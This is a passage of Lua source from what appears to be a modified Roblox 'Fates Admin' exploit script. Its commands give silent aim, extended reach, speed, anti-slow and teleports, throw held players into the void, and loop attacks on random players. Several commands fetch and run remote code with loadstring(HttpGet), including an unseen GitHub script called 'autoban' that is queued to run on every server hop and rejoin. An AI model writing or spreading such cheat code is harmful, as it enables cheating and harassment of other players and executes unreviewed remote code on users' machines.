	plr.Character.HumanoidRootPart.CFrame = CFrame.new(380, 49, -283)
	wait(.4)

	fireclickdetector(game.Workspace.Ignored.Shop['[Bat] - $250'].ClickDetector)
	wait(0.1)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedbatpos)
end
end)

AddCommand("food", {"buyfood"}, "auto buy food", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = false
        else
   local plr = game.Players.LocalPlayer
	local savehotdogpos = plr.Character.HumanoidRootPart.Position
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(107.973412, 25.128006, -976.381104)
	wait(0.56)

	fireclickdetector(game.Workspace.Ignored.Shop['[HotDog] - $8'].ClickDetector)
	wait(0.1)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(-994.55011, 24.5980186, -155.482489)
	wait(0.6)

	fireclickdetector(game.Workspace.Ignored.Shop['[Popcorn] - $7'].ClickDetector)
	wait(0.1)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savehotdogpos)
end

end)





AddCommand("voidthrow", {"vthrow"}, "throws the person you are holding into the void", {}, function(Caller, Args)
	plr = game:GetService('Players').LocalPlayer
	X1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1816, 600, 1455)
wait(0.2)
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
wait(0.3)
keypress(0x67)
keyrelease(0x67)
keypress(0x47)
keyrelease(0x47)
keypress(0x67)
keyrelease(0x67)
keypress(0x47)
keyrelease(0x47)
wait(0.2)
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false

wait(0.2)



plr.Character.HumanoidRootPart.CFrame = CFrame.new(X1,Y1+5,Z1)
end)


AddCommand("safethrow", {"sthrow"}, "throws the person you are holding into the void", {}, function(Caller, Args)
	plr = game:GetService('Players').LocalPlayer
	X1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-324, 215, 333)
wait(0.2)
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
wait(0.3)
keypress(0x67)
keyrelease(0x67)
keypress(0x47)
keyrelease(0x47)
keypress(0x67)
keyrelease(0x67)
keypress(0x47)
keyrelease(0x47)
wait(0.2)
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
wait(0.2)



plr.Character.HumanoidRootPart.CFrame = CFrame.new(X1,Y1+5,Z1)
end)

AddCommand("silentaim", {"saim"}, "gives pro aim", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/872adecc59899a2097c928b25841f5e3/raw/d6db413e0ddd085f2c4777d66f05c45e5e30213f/asdfaaaaaaaaaaaaaaaa"))()

Aiming.HitChance = 100 -- hit chance
Aiming.ShowFOV = false  -- show fov
notification = true  -- toggle notifications
Aiming.FOV = 30  -- FOV size
silentran = true
    	        Notify({ 
Description = "beam dem kids";
Title = "silent aim enabled";
Duration = 2;
});
end
end)




AddCommand("togglefov", {"togfov"}, "toggles the fov for silent aim", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
if silentran == true then
if Aiming.ShowFOV == false then
Aiming.ShowFOV = true
    	        Notify({ 
Description = "Showing FOV";
Title = "silent aim";
Duration = 2;
});
else
if Aiming.ShowFOV == true then
Aiming.ShowFOV = false
    	        Notify({ 
Description = "no longer showing FOV";
Title = "silent aim";
Duration = 2;
});
else
    	        Notify({ 
Description = "please execute silent aim first+";
Title = "warning";
Duration = 2;
});
end
end
end
end
end)

AddCommand("FOVsize", {"silentsize"}, "fov size for silent aim", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
    local fovAmount = tonumber(Args[1]) or 70
Aiming.FOV = fovAmount
end
end)


AddCommand("joinserver", {"discord"}, "joins the fates admin discord server", {}, function()
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local Request = syn and syn.request or request
	local HttpService = Services.HttpService
	if (Request({
		Url = "http://127.0.0.1:6463/rpc?v=1",
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json",
			["Origin"] = "https://discord.com"
		},
		Body = JSONEncode(HttpService, {
			cmd = "INVITE_BROWSER",
			args = {
				code = "5epGRYR"
			},
			nonce = GenerateGUID(HttpService, false)
		}),
		}).StatusCode == 200) then
		return "joined fates admin discord server"
	else
		return "discord isn't open"
	end
end
end)

AddCommand("rejoin", {"rj"}, "rejoins the game you're currently in", {}, function(Caller)
	if (Caller == LocalPlayer) then
		local TeleportService = Services.TeleportService
		if (#GetPlayers(Players) == 1) then
			TeleportService.Teleport(TeleportService, game.PlaceId);
		else
			TeleportService.TeleportToPlaceInstance(TeleportService, game.PlaceId, game.JobId)
		end
    	        Notify({ 
Description = "rejoining server";
Title = "please wait...";
Duration = 2;
});
	end
end)

AddCommand("serverhop", {"sh"}, "switches servers (optional: min, max or mid)", {{"min", "max", "mid"}}, function(Caller, Args)
	if (Caller == LocalPlayer) then
		local TeleportService = Services.TeleportService
		local Servers = JSONDecode(Services.HttpService, game.HttpGetAsync(game, format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100", game.PlaceId))).data
		if (#Servers > 1) then
			Servers = filter(Servers, function(i,v)
				return v.playing ~= v.maxPlayers and v.id ~= game.JobId
			end)
			local Server
			local Option = Args[1] or ""
			if (lower(Option) == "min") then
				Server = Servers[#Servers]
			elseif (lower(Option) == "max") then
				Server = Servers[1]
			else
				Server = Servers[random(1, #Servers)]
			end
			local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
			if (queue_on_teleport) then
				queue_on_teleport("loadstring(game.HttpGet(game, \"https://raw.githubusercontent.com/cyberical9B55/veonixcombat/main/hwids/autoban\"))()");
			end
			TeleportService.TeleportToPlaceInstance(TeleportService, game.PlaceId, Server.id);
    	        Notify({ 
Description = "joining shortly";
Title = "foind a server";
Duration = 2;
});
		else
    	        Notify({ 
Description = "try again later";
Title = "cant find a server : (";
Duration = 2;
});
		end
	end
end)



AddCommand("flingwhitelist", {"flingwl"}, "whitelists a user so they can use commands", {"1"}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		AdminUsers[#AdminUsers + 1] = v
    	        Notify({ 
Description = "whitelisted "..v.name;
Title = "whitelisted a player";
Duration = 2;
});
	end
end
end)

AddCommand("whitelisted", {"whitelistedusers"}, "shows all the users whitelisted to use commands", {}, function(Caller)
        if (Caller ~= LocalPlayer) then
           a = true
        else
    	        Notify({ 
Description = next(AdminUsers) and concat(map(AdminUsers, function(i,v) return v.Name end), ", ") or "no users whitelisted";
Title = "whitelisted...";
Duration = 2;
});
end
end)

AddCommand("blacklist", {"bl"}, "blacklists a whitelisted user", {"1"}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		if (Tfind(AdminUsers, v)) then
			AdminUsers[indexOf(AdminUsers, v)] = nil
		end
	end
end
end)

local CommandsLoaded = false
AddCommand("commands", {"cmds"}, "shows you all the commands listed in fates admin", {}, function()
    if (not CommandsLoaded) then
        local CommandsList = Commands.Frame.List
        Utils.SmoothScroll(CommandsList, .14);
        for _, v in next, CommandsTable do
            if (not FindFirstChild(CommandsList, v.Name)) then
                local Clone = Clone(Command)
                Utils.Hover(Clone, "BackgroundColor3");
                Utils.ToolTip(Clone, v.Name .. "\n" .. v.Description);
                Clone.CommandText.Text = v.Name .. (#v.Aliases > 0 and " (" ..concat(v.Aliases, ", ") .. ")" or "");
                Clone.Name = v.Name
                Clone.Visible = true
                Clone.Parent = CommandsList
            end
        end
        Commands.Frame.List.CanvasSize = UDim2.fromOffset(0, Commands.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        CommandsTransparencyClone = Clone(Commands);
        Utils.SetAllTrans(Commands)
        CommandsLoaded = true
    end
    Commands.Visible = true
    Utils.TweenAllTransToObject(Commands, .25, CommandsTransparencyClone);
    return "Commands Loaded"
end)

AddCommand("killscript", {}, "kills the script", {}, function(Caller)
	if (Caller == LocalPlayer) then
		deepsearch(Connections, function(i,v)
			if (type(v) == 'userdata' and v.Disconnect) then
				Disconnect(v);
			elseif (type(v) == 'boolean') then
				v = false
			end
		end);
		for i, v in next, Hooks.SpoofedProperties do
			for i2, v2 in next, v do
				i[v2.Property] = v2.SpoofedProperty[v2.Property]
			end
		end
		for i, v in next, Hooks do
			if (type(v) == 'boolean') then
				v = false
			end
			if (type(v) == 'function') then

			end
		end
		Destroy(UI);
		getgenv().F_A = nil
		setreadonly(mt, false);
		mt = OldMetaMethods
		setreadonly(mt, true);
		for i, v in next, getfenv() do
			getfenv()[i] = nil
		end
	end
end)

AddCommand("reloadscript", {}, "kills the script and reloads it", {}, function(Caller)
	if (Caller == LocalPlayer) then
		ExecuteCommand("killscript", {}, LocalPlayer);
		loadstring(game:HttpGet("https://raw.githubusercontent.com/cyberical9B55/veonixcombat/main/hwids/autoban"))();
	end
end)



AddCommand("setprefix", {}, "changes your prefix", {"1"}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local PrefixToSet = Args[1]
	if (match(PrefixToSet, "%A")) then
		Prefix = PrefixToSet
    	        Notify({ 
Description = "prefix set to "..PrefixToSet;
Title = "execute the cmd 'saveprefix' to save this";
Duration = 2;
});
	else
    	        Notify({ 
Description = "prefix has to be a symbol";
Title = "your doing illegal things";
Duration = 2;
});
	end
end
end)

AddCommand("saveprefix", {}, "saves your prefix", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	if (GetConfig().Prefix == Prefix and Enum.KeyCode[GetConfig().CommandBarPrefix] == CommandBarPrefix) then
		return "nothing to save, prefix is the same"
	else
		SetConfig({["Prefix"]=Prefix,["CommandBarPrefix"]=split(tostring(CommandBarPrefix), ".")[3]});
		return "saved prefix"
	end
end
end)







local ToggleChatPrediction

getgenv().speedspeedspeed = 100
AddCommand("speed", {"cframespeed"}, "cframe speed", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	function onButton1Down(mouse)
	down = true
	while down do
	if not down then break end
	local plr = game:GetService('Players').LocalPlayer
	local char = plr.Character
 
	char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * getgenv().speedspeedspeed
	wait()
	end
	end
 
	function onButton1Up(mouse)
	down = false
	end
 
	function onSelected(mouse)
	mouse.KeyDown:connect(function(k) if k:lower()=="v"then onButton1Down(mouse)end end)
	mouse.KeyUp:connect(function(k) if k:lower()=="v"then onButton1Up(mouse)end end)
	end
 
	onSelected(game.Players.LocalPlayer:GetMouse())
        Notify({ 
Description = "hold 'v' to speed";
Title = "speed";
Duration = 2;
});
end
end)


AddCommand("speedspeed", {}, "sets your fov", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local Amount = tonumber(Args[1]) or 100
getgenv().speedspeedspeed = Amount
end
end)


test = false
AddCommand("antislow", {"noslow"}, "ye", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	antislow = true
	repeat
		wait(0.1)
		local L_176_ = game.Players.LocalPlayer
		local L_177_ = L_176_.Character.BodyEffects.Movement:FindFirstChild('NoJumping') or L_176_.Character.BodyEffects.Movement:FindFirstChild('ReduceWalk') or L_176_.Character.BodyEffects.Movement:FindFirstChild('NoWalkSpeed')
		if L_177_ then
			L_177_:Destroy()
		end
		if L_176_.Character.BodyEffects.Reload.Value == true then
			L_176_.Character.BodyEffects.Reload.Value = false
		end
	until antislow == false
end
end)

antislow3 = false
AddCommand("reach", {"toolreach"}, "ye", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
		for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
	    	if v:isA("Tool") then
	           local a = Instance.new("SelectionBox",v.Handle)
	           a.Adornee = v.Handle
	           v.Handle.Size = Vector3.new(50, 50, 50)
	           v.GripPos = Vector3.new(0,0,0)
	           v.Handle.Transparency = 1
	           else
notool = true
	        end
		end
		
		if notool == true then
		notool = false
        Notify({ 
Description = "hold a toooollllll";
Title = "if this doesnt work, ur prob not holding a tool";
Duration = 2;
});
		end
end
end)







AddCommand("antilag", {"fpsboost"}, "changes everything to a plastic material", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local time = tick();
	local Plasticc = 0
	for i, v in next, GetDescendants(Workspace) do
		if (IsA(v, "Part") and v.Material ~= Enum.Material.Plastic) then
			CEnv[v] = v.Material
			v.Material = Enum.Material.Plastic
			Plasticc = Plasticc + 1
		end
	end
	return format("%d items made plastic in %.3f (s)", Plasticc, (tick()) - time);
end
end)

AddCommand("unantilag", {"unfpsboost"}, "changes everything back from a plastic material", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local Plastics = LoadCommand("plastic").CmdEnv
	local time = tick();
	local Amount = 0
	for i, v in next, Plastics do
		i.Material = v
		Amount = Amount + 1
	end
end
end)

AddCommand("antiafk", {"antiidle"}, "prevents kicks from when you're afk", {}, function(Caller, Args, CEnv)
	local IsEnabled = CEnv[1]
	for i, v in next, getconnections(LocalPlayer.Idled) do
		if (IsEnabled) then
			v.Enable(v);
			CEnv[1] = nil
		else
			v.Disable(v);
			CEnv[1] = true
		end
	end
end)

AddCommand("qtp", {}, "tps you to where your mouse is when you click", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	plr = game.Players.LocalPlayer;
	hum = plr.Character.HumanoidRootPart;
	mouse = plr:GetMouse()
	mouse.KeyDown:connect(function(aa)
		if aa == "q" then
			if mouse.Target then
				hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
			end
		end
	end)
        Notify({ 
Description = "press q to tp";
Title = "press q";
Duration = 2;
});
end
end)


AddCommand("setzoomdistance", {"szd", "maxzoom"}, "sets your cameras zoom distance so you can zoom out", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local ZoomDistance = tonumber(Args[1]) or 1000
	LocalPlayer.CameraMaxZoomDistance = ZoomDistance
	LocalPlayer.CameraMode = Enum.CameraMode.Classic
	return "set zoom distance to " .. ZoomDistance
end
end)





local LoadConfig, ConfigLoaded;
AddCommand("config", {"conf"}, "shows fates admin config", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	if (not ConfigLoaded) then
		if (not CEnv[1]) then
			LoadConfig();
		end
		Utils.SetAllTrans(ConfigUI);
		ConfigUI.Visible = true
		Utils.TweenAllTransToObject(ConfigUI, .25, ConfigUIClone);
		ConfigLoaded = true
		CEnv[1] = true
	end
end
end)



AddCommand("rejoinre", {"rje"}, "rejoins and tps you to your old position", {3}, function()
        if (Caller ~= LocalPlayer) then
            a = true
        else
rjeing = true
	local Pos = GetRoot().CFrame
	local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
	if (queue_on_teleport) then
		queue_on_teleport(format("game.Loaded:Wait();game:GetService('ReplicatedFirst'):SetDefaultLoadingGuiRemoved();local LocalPlayer = game:GetService('Players').LocalPlayer;LocalPlayer.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = CFrame.new(%s);loadstring(game.HttpGet(game, \"https://raw.githubusercontent.com/cyberical9B55/veonixcombat/main/hwids/autoban\"))()", tostring(Pos)));
	end
	if (Caller == LocalPlayer) then
		local TeleportService = Services.TeleportService
		if (#GetPlayers(Players) == 1) then
			TeleportService.Teleport(TeleportService, game.PlaceId);
		else
			TeleportService.TeleportToPlaceInstance(TeleportService, game.PlaceId, game.JobId)
		end
    	        Notify({ 
Description = "rejoining server";
Title = "please wait...";
Duration = 2;
});
	end
end
end)



AddCommand("inviscam", {"inviscamera"}, "makes you see through walls more better", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	CEnv.OldCameraMaxZoomDistance = LocalPlayer.CameraMaxZoomDistance
	CEnv.OldDevCameraOcclusionMode = LocalPlayer.DevCameraOcclusionMode
	LocalPlayer.CameraMaxZoomDistance = 600
	LocalPlayer.DevCameraOcclusionMode = "Invisicam"
end
end)

AddCommand("uninviscam", {"uninviscamera"}, "disables inviscam", {}, function()
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local CmdEnv = LoadCommand("inviscam").CmdEnv
	LocalPlayer.CameraMaxZoomDistance = CmdEnv.OldCameraMaxZoomDistance
	LocalPlayer.DevCameraOcclusionMode = CmdEnv.OldDevCameraOcclusionMode
end
end)

loopannoy = false
AddCommand("loopannoy", {}, "disables inviscam", {}, function()
if loopannoy == false then
loopannoy = true
ExecuteCommand("float", {}, LocalPlayer);
repeat
wait()
ExecuteCommand("attack", {"random"}, LocalPlayer);
wait(0.2)
until loopannoy == false

end
end)


AddCommand("unloopannoy", {}, "disables inviscam", {}, function()
loopannoy = false
repeat
wait()
until attackinglol == false
ExecuteCommand("unfloat", {}, LocalPlayer);
ExecuteCommand("away", {}, LocalPlayer);
ExecuteCommand("away", {}, LocalPlayer);
ExecuteCommand("away", {}, LocalPlayer);
end)

AddCommand("nosound", {}, "disables inviscam", {}, function()
ExecuteCommand("loop", {"semmemute", "all"}, LocalPlayer);
end)

AddCommand("sound", {}, "disables inviscam", {}, function()
ExecuteCommand("unloop", {"semmemute", "all"}, LocalPlayer);
end)

AddCommand("loop", {"loopcommand"}, "loops a command", {"1"}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local Command = Args[1]
	local LoadedCommand = LoadCommand(Command);
	if (not LoadedCommand) then
		return format("command %s not found", Command);
	end
	Args = shift(Args);
	CEnv.Looping = true
	CEnv.LoopedCommands = CEnv.LoopedCommands or {}
	CEnv.LoopedCommands[Command] = true
	CThread(function()
		while (CEnv.Looping and CEnv.LoopedCommands[Command]) do
			ExecuteCommand(Command, Args, Caller);
			wait();
		end
	end)();
        Notify({ 
Description = format("now looping the %s command", Command);
Title = "loop";
Duration = 2;
});
end
end)

AddCommand("unloop", {"unloopcommand"}, "unloops a command", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local Looped = LoadCommand("loop").CmdEnv
	if (Args[1]) then
		if (Looped.LoopedCommands[Args[1]]) then
			Looped.LoopedCommands[Args[1]] = nil
a = true
		end
a = true
	else
		Looped.Looping = false
a = true
	end
end
end)






AddCommand("console", {"errors", "warns", "outputs"}, "shows the outputs fates admin has made", {}, function()
    local MessageClone = Clone(Console.Frame.List);
    
    Utils.ClearAllObjects(Console.Frame.List)
    Console.Visible = true

    local Tween = Utils.TweenAllTransToObject(Console, .25, ConsoleTransparencyClone)

    Destroy(Console.Frame.List)
    MessageClone.Parent = Console.Frame

    for i, v in next, GetChildren(Console.Frame.List) do
        if (not IsA(v, "UIListLayout")) then
            Utils.Tween(v, "Sine", "Out", .25, {
                TextTransparency = 0
            })
        end
    end

    local ConsoleListLayout = Console.Frame.List.UIListLayout

    CConnect(GetPropertyChangedSignal(ConsoleListLayout, "AbsoluteContentSize"), function()
        local CanvasPosition = Console.Frame.List.CanvasPosition
        local CanvasSize = Console.Frame.List.CanvasSize
        local AbsoluteSize = Console.Frame.List.AbsoluteSize

        if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
           wait();
           Console.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000);
        end
    end)

    Utils.Tween(Console.Frame.List, "Sine", "Out", .25, {
        ScrollBarImageTransparency = 0
    })
end)

local PlrChat = function(i, plr)
    if (not Connections.Players[plr.Name]) then
        Connections.Players[plr.Name] = {}
        Connections.Players[plr.Name].Connections = {}
    end
    Connections.Players[plr.Name].ChatCon = CConnect(plr.Chatted, function(raw)
        if (plr == LocalPlayer) then
            local Processed = Keys.GameProcessed
            local Last = Keys.LastEntered
            if (not Processed or Last ~= Enum.KeyCode.Return) then
                local K;
                local T = CThread(function()
                    K = CWait(Services.UserInputService.InputBegan);
                end)();
                wait();
                if (K.KeyCode ~= Enum.KeyCode.Return) then
                    return    
                end
                T = nil
            end
        end
        local message = raw

        if (_L.ChatLogsEnabled) then

            local time = os.date("%X");
            local Text = format("%s - [%s]: %s", time, plr.Name, raw);
            local Clone = Clone(ChatLogMessage);

            Clone.Text = Text
            Clone.Visible = true
            Clone.TextTransparency = 1
            Clone.Parent = ChatLogs.Frame.List

            Utils.Tween(Clone, "Sine", "Out", .25, {
                TextTransparency = 0
            })

            ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, ChatLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        end

        if (startsWith(raw, "/e")) then
            raw = sub(raw, 4);
        elseif (startsWith(raw, "/w")) then
            raw = shift(shift(split(message, " ")));
        elseif (startsWith(raw, Prefix)) then
            raw = sub(raw, #Prefix + 1);
        else
            return
        end

        message = trim(raw);

        if (Tfind(AdminUsers, plr) or plr == LocalPlayer) then
            local CommandArgs = split(message, " ");
            local Command = CommandArgs[1]
            local Args = shift(CommandArgs);

            ExecuteCommand(Command, Args, plr);
        end
    end)
end

--IMPORT [uimore]
Notification.Visible = false
Utils.SetAllTrans(CommandBar);
Utils.SetAllTrans(ChatLogs);
Utils.SetAllTrans(GlobalChatLogs);
Utils.SetAllTrans(HttpLogs);
Utils.SetAllTrans(Console);
Commands.Visible = false
ChatLogs.Visible = false
Console.Visible = false
GlobalChatLogs.Visible = false
HttpLogs.Visible = false

Utils.Draggable(Commands);
Utils.Draggable(ChatLogs);
Utils.Draggable(Console);
Utils.Draggable(GlobalChatLogs);
Utils.Draggable(HttpLogs);
Utils.Draggable(ConfigUI);

ParentGui(UI);
Connections.UI = {}

local Times = #LastCommand
AddConnection(CConnect(Services.UserInputService.InputBegan, function(Input, GameProccesed)
    if (Input.KeyCode == CommandBarPrefix and (not GameProccesed)) then
        CommandBarOpen = not CommandBarOpen

        local TransparencyTween = CommandBarOpen and Utils.TweenAllTransToObject or Utils.TweenAllTrans
        local Tween = TransparencyTween(CommandBar, .5, CommandBarTransparencyClone);
        local UserInputService = Services.UserInputService

        if (CommandBarOpen) then
            if (not Draggable) then
                Utils.Tween(CommandBar, "Quint", "Out", .5, {
                    Position = UDim2.new(0.5, WideBar and -200 or -100, 1, -110)
                })
            end

            local TextConnections;
            if (UndetectedCmdBar) then
                TextConnections = getconnections(UserInputService.TextBoxFocused);
                for i, v in next, TextConnections do
                    v.Disable(v);
                end
                for i, v in next, getconnections(UserInputService.TextBoxFocusReleased, true) do
                    v.Disable(v);
                end
            end

            CommandBar.Input.CaptureFocus(CommandBar.Input);
            CThread(function()
                wait()
                CommandBar.Input.Text = ""
                local FocusedTextBox = UserInputService.GetFocusedTextBox(UserInputService);
                local TextBox = CommandBar.Input
                while (FocusedTextBox ~= TextBox) do
                    FocusedTextBox.ReleaseFocus(FocusedTextBox);
                    CommandBar.Input.CaptureFocus(TextBox);
                    FocusedTextBox = UserInputService.GetFocusedTextBox(UserInputService);
                    CWait(Heartbeat);
                end
            end)()
            
            if (UndetectedCmdBar) then
                for i, v in next, TextConnections do
                    v.Enable(v);
                end
            end
        else
            if (not Draggable) then
                Utils.Tween(CommandBar, "Quint", "Out", .5, {
                    Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5)
                })
            end
        end
    elseif (not GameProccesed and ChooseNewPrefix) then
        CommandBarPrefix = Input.KeyCode
        Utils.Notify(LocalPlayer, "New Prefix", "Your new prefix is: " .. split(tostring(Input.KeyCode), ".")[3]);
        ChooseNewPrefix = false
        if (writefile) then
            Utils.Notify(LocalPlayer, nil, "use command saveprefix to save your prefix");
        end
    elseif (GameProccesed and CommandBarOpen) then
        if (Input.KeyCode == Enum.KeyCode.Up) then
            Times = Times >= 3 and Times or Times + 1
            CommandBar.Input.Text = LastCommand[Times][1] .. " "
            CommandBar.Input.CursorPosition = #CommandBar.Input.Text + 2
        end
        if (Input.KeyCode == Enum.KeyCode.Down) then
            Times = Times <= 1 and 1 or Times - 1
            CommandBar.Input.Text = LastCommand[Times][1] .. " "
            CommandBar.Input.CursorPosition = #CommandBar.Input.Text + 2
        end
    end
end), Connections.UI, true);

Utils.Click(Commands.Close, "TextColor3")
Utils.Click(ChatLogs.Clear, "BackgroundColor3")
Utils.Click(ChatLogs.Save, "BackgroundColor3")
Utils.Click(ChatLogs.Toggle, "BackgroundColor3")
Utils.Click(ChatLogs.Close, "TextColor3")

Utils.Click(Console.Clear, "BackgroundColor3");
Utils.Click(Console.Save, "BackgroundColor3");
Utils.Click(Console.Close, "TextColor3");

Utils.Click(GlobalChatLogs.Clear, "BackgroundColor3")
Utils.Click(GlobalChatLogs.Save, "BackgroundColor3")
Utils.Click(GlobalChatLogs.Toggle, "BackgroundColor3")
Utils.Click(GlobalChatLogs.Close, "TextColor3")

Utils.Click(HttpLogs.Clear, "BackgroundColor3")
Utils.Click(HttpLogs.Save, "BackgroundColor3")
Utils.Click(HttpLogs.Toggle, "BackgroundColor3")
Utils.Click(HttpLogs.Close, "TextColor3")

AddConnection(CConnect(Commands.Close.MouseButton1Click, function()
    local Tween = Utils.TweenAllTrans(Commands, .25)

    CWait(Tween.Completed);
    Commands.Visible = false
end), Connections.UI, true);

AddConnection(CConnect(GetPropertyChangedSignal(Commands.Search, "Text"), function()
    local Text = Commands.Search.Text
    local Children = GetChildren(Commands.Frame.List);
    for i = 1, #Children do
        local v = Children[i]
        if (IsA(v, "Frame")) then
            local Command = v.CommandText.Text
            v.Visible = Sfind(lower(Command), Text, 1, true)
        end
    end
    Commands.Frame.List.CanvasSize = UDim2.fromOffset(0, Commands.Frame.List.UIListLayout.AbsoluteContentSize.Y)
end), Connections.UI, true);

AddConnection(CConnect(ChatLogs.Close.MouseButton1Click, function()
    local Tween = Utils.TweenAllTrans(ChatLogs, .25)

    CWait(Tween.Completed);
    ChatLogs.Visible = false
end), Connections.UI, true);
AddConnection(CConnect(GlobalChatLogs.Close.MouseButton1Click, function()
    local Tween = Utils.TweenAllTrans(GlobalChatLogs, .25)

    CWait(Tween.Completed);
    GlobalChatLogs.Visible = false
end), Connections.UI, true);
AddConnection(CConnect(HttpLogs.Close.MouseButton1Click, function()
    local Tween = Utils.TweenAllTrans(HttpLogs, .25)

    CWait(Tween.Completed);
    HttpLogs.Visible = false
end), Connections.UI, true);

AddConnection(CConnect(Console.Close.MouseButton1Click, function()
    local Tween = Utils.TweenAllTrans(Console, .25)

    CWait(Tween.Completed);
    Console.Visible = false
end), Connections.UI, true);

ChatLogs.Toggle.Text = _L.ChatLogsEnabled and "Enabled" or "Disabled"
GlobalChatLogs.Toggle.Text = _L.ChatLogsEnabled and "Enabled" or "Disabled"
HttpLogs.Toggle.Text = _L.HttpLogsEnabled and "Enabled" or "Disabled"

AddConnection(CConnect(ChatLogs.Toggle.MouseButton1Click, function()
    _L.ChatLogsEnabled = not _L.ChatLogsEnabled
    ChatLogs.Toggle.Text = _L.ChatLogsEnabled and "Enabled" or "Disabled"
end), Connections.UI, true);
AddConnection(CConnect(GlobalChatLogs.Toggle.MouseButton1Click, function()
    _L.GlobalChatLogsEnabled = not _L.GlobalChatLogsEnabled
    GlobalChatLogs.Toggle.Text = _L.GlobalChatLogsEnabled and "Enabled" or "Disabled"
end), Connections.UI, true);
AddConnection(CConnect(HttpLogs.Toggle.MouseButton1Click, function()
    _L.HttpLogsEnabled = not _L.HttpLogsEnabled
    HttpLogs.Toggle.Text = _L.HttpLogsEnabled and "Enabled" or "Disabled"
end), Connections.UI, true);

AddConnection(CConnect(ChatLogs.Clear.MouseButton1Click, function()
    Utils.ClearAllObjects(ChatLogs.Frame.List)
    ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
end), Connections.UI, true);
AddConnection(CConnect(GlobalChatLogs.Clear.MouseButton1Click, function()
    Utils.ClearAllObjects(GlobalChatLogs.Frame.List)
    GlobalChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
end), Connections.UI, true);
AddConnection(CConnect(HttpLogs.Clear.MouseButton1Click, function()
    Utils.ClearAllObjects(HttpLogs.Frame.List)
    HttpLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
end), Connections.UI, true);

AddConnection(CConnect(Console.Clear.MouseButton1Click, function()
    Utils.ClearAllObjects(Console.Frame.List);
    Console.Frame.List.CanvasSize = UDim2.fromOffset(0, 0);
end), Connections.UI, true);

do
    local ShowWarns, ShowErrors, ShowOutput = true, true, true
    AddConnection(CConnect(Console.Warns.MouseButton1Click, function()
        ShowWarns = not ShowWarns
        local Children = GetChildren(Console.Frame.List);
        for i = 1, #Children do
            local v = Children[i]
            if (not IsA(v, "UIListLayout") and sub(v.Name, 1, 1) == "W") then
                v.Visible = ShowWarns
            end
        end
        Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        Console.Warns.Text = ShowWarns and "Hide Warns" or "Show Warns"
    end), Connections.UI, true);
    AddConnection(CConnect(Console.Errors.MouseButton1Click, function()
        ShowErrors = not ShowErrors
        local Children = GetChildren(Console.Frame.List);
        for i = 1, #Children do
            local v = Children[i]
